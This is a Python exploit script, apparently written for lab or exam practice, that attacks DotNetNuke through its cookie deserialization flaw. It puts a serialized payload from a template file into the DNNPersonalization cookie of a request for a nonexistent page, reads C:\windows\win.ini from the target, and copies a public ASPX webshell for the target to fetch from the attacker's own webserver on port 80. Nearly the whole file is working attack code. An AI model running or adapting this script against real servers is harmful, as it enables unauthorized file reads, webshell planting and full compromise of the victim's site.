import sys, re, os
import requests
import subprocess
import base64

def generate_shell():
	# Generate aspx webshell
	cmd = "cp /usr/share/webshells/aspx/cmdasp.aspx ."
	subprocess.run(cmd, shell=True)

def generate_payload(filename):
	with open("payload.xml", "r") as f:
		payload = f.read()
	payload = payload.replace('inputFilename', filename)
	return payload

def send_payload(ip, payload):

	s = requests.Session()

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	# proxies = {
	# 	'http': 'http://127.0.0.1:8080',
	# 	'https': 'http://127.0.0.1:8080'
	# }
	# s.proxies.update(proxies)

	headers = {
		'Content-Type': 'application/x-www-form-urlencoded'
	}

	cookies = {
		'DNNPersonalization': payload
	}
	target = f"http://{ip}/dotnetnuke/thispagedoesnotexist"

	r = s.get(target,headers=headers,cookies=cookies)
	
	if r.status_code != 404:
		print("An error occured sending the payload")
		exit(0)

	text = r.text
	# Remove everything after the last doctype html
	text = text.split('<!DOCTYPE html')
	text.pop()
	text = '<!DOCTYPE html'.join(text)
	return text

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    filename = 'C:\\windows\\win.ini'

    print("Copying shell over from public webshells")
    generate_shell()

    print("Generating payload")
    payload = generate_payload(filename)
    print(payload)

    print("Sending payload, make sure you have webserver running on port 80 in current directory")
    print(send_payload(ip, payload))

if __name__ == '__main__':
	main()